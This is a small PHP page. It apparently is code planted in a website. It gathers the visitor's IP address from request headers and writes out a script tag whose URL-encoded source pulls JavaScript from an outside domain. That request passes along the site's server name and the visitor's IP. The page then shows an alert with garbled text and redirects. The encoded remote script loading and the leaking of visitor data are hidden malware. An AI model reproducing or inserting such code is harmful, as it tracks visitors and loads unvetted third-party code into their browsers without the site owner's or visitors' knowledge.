
<?php
$i=$_GET['i'];
?>

<?php
if ($i=="")
{
$i=1;
if ($HTTP_SERVER_VARS["HTTP_X_FORWARDED_FOR"]) { $ip = $HTTP_SERVER_VARS["HTTP_X_FORWARDED_FOR"]; } elseif ($HTTP_SERVER_VARS["HTTP_CLIENT_IP"]) { $ip = $HTTP_SERVER_VARS["HTTP_CLIENT_IP"]; }elseif ($HTTP_SERVER_VARS["REMOTE_ADDR"]) { $ip = $HTTP_SERVER_VARS["REMOTE_ADDR"]; } elseif (getenv("HTTP_X_FORWARDED_FOR")) { $ip = getenv("HTTP_X_FORWARDED_FOR"); } elseif (getenv("HTTP_CLIENT_IP")) { $ip = getenv("HTTP_CLIENT_IP"); } elseif (getenv("REMOTE_ADDR")){ $ip = getenv("REMOTE_ADDR"); } else { $ip = "Unknown"; } ?>
<SCRIPT LANGUAGE="JavaScript" src="http://%36%2E%6D%79%65%65%61%2E%63%6F%6D/6hc/i.php?u=<?=$_SERVER['SERVER_NAME']?>&q=<?=$ip?>x6"></SCRIPT>

<?php
}

if ($i==1)
{?>
<script language="javascript"> alert("∑«∑®∑√Œ £°");top.location='x6.php?i=0'; </script>
<?php }?>